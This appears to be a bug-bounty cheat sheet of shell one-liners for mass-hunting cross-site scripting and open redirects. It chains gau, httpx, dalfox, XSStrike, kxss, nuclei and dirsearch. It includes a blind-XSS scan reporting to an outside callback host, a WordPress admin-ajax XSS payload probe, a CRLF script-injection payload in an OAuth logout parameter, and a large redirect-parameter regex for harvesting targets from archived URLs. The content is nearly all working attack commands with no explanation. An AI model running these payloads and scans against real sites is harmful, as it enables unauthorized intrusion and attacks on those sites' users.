## XSS
    echo vulnweb.com | gau | tee domain.txt
    httpx -l domain.txt -mc 200,302 -o domain200.txt 
    cat domain200.txt | gf xss | sed "s/=.*/=/" | sed "s/URL: //" | tee domain4xss.txt 
    cat urls.txt | uro 
    dalfox file domain4xss.txt -b (xss.ht or collaborator) pipe 
    cat indeed.txt | kxss > xss.txt 
    python XSStrike/xsstrike.py --seeds domain4xss.txt --fuzzer --level 3 -rate 2 --blind --file-log-level WARNING --log-file output.log

    cat list.txt | httpx | xargs -I {} python xsstrike.py -u {} --level 3  --blind --file-log-level WARNING --log-file output.log

    cat urls.txt | go run ParamsReflect.go
    cat injected_urls.txt | sort -u | httpx -ms "<h1>akira</h1>" -fe "Location: .*<h1>akira</h1>.*" -t 200

## wordpressXss:
    cat domain.txt | httpx -path "/wp-admin/admin-ajax.php?action=ptp_design4_color_columns&post_id=1&column_names=%3Ch1%3EAkira%3C/h1%3E" -ms "<h1>Akira</h1>" -fe "Location: .*<h1>Akira</h1>.*" -t 200 -mc 200

    
## Open Redirect
    cat URlSubs.txt | ~/go/bin/httpx -path "/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a%3Cscript%3Ealert('XSSSS')%3C/script%3E" -ms "XSSSSS" -fe "Location: .*XSSS.*" -t 200 -o xss.txt

    
    echo "https://web.archive.org/cdx/search/cdx?url=*.example.com&fl=original&collapse=urlkey" | httpx -er '(https?://[^&\s]+)[^&\s]*(\?|&)(outurl=|redirectionURL=|refURL=|returnURL=|siteurl=|targetURL=|urlTo=|redirectLocation=|redirectPage=|redirectPath=|redirectUrlTo=|urlRedirect=|redirectTo=|linkTo=|urlOut=|outboundUrl=|navTo=|jumpTo=|clickTo=|linkURL=|directTo=|moveTo=|outgoing_url=|outbound_link=|location_to=|forward=|from_url=|go=|goto=|host=|html=|image_url=|img_url=|load_file=|load_url=|login?to=|login_url=|logout=|navigation=|next=|next_page=|out=|page=|page_url=|path=|port=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|reference=|return=|returnTo=|return_path=|return_to=|return_url=|rt=|rurl=|show=|site=|target=|to=|uri=|url=|val=|validate=|view=|window=|location=|link=|click=|move=|jump=|follow=|nav=|ref=|locationURL=|redirectURL=|redirect_to_url=|pageurl=|navigate=|returnUrl=|redirectlink=|redirection=|referral=|direct=|forwardto=|gotoURL=|outlink=|targ=|linkto=|sendto=|dest=|destURL=|destination=|finalURL=|newUrl=|goToUrl=|navToURL=|referralURL=|returnURI=|uri_redirect=|path_redirect=|url_redirect=|location_redirect=|returnPath=|returnToURL=|outgoingURL=|redirectURI=|redirect_path=|redirect_url_path=|targetPath=|clickTarget=|followURL=|linkOut=|location_href=|jumpURL=|returnLink=|refLink=|sendURL=|url_destination=|redirect_destination=|goto_url=|forward_url=|nav_to=|move_to_url=|url_location=|redirect_location=|target_url=|target_link=|return_url_path=|return_to_path=|outgoing_link=|link_destination=|click_destination=|redirector=|redirection_link=|uri_location=|url_path=|path_to=|path_redirector=|go_url=|forward_link=|location_path=)[^&\s]*' -json | jq '.extracts[]' | sed 's/  "//g'| sed 's/"//g' | sed 's/\[//g' | sed 's/\]//g' | sed 's/,//g' > openredirect.txt


## Nuclie
    
    nuclei -l domains.txt -es info -ept ssl -o data.txt
    # dirsearch 
    dirsearch -l domain200.txt -e '' -i 200-299 -x 300-599

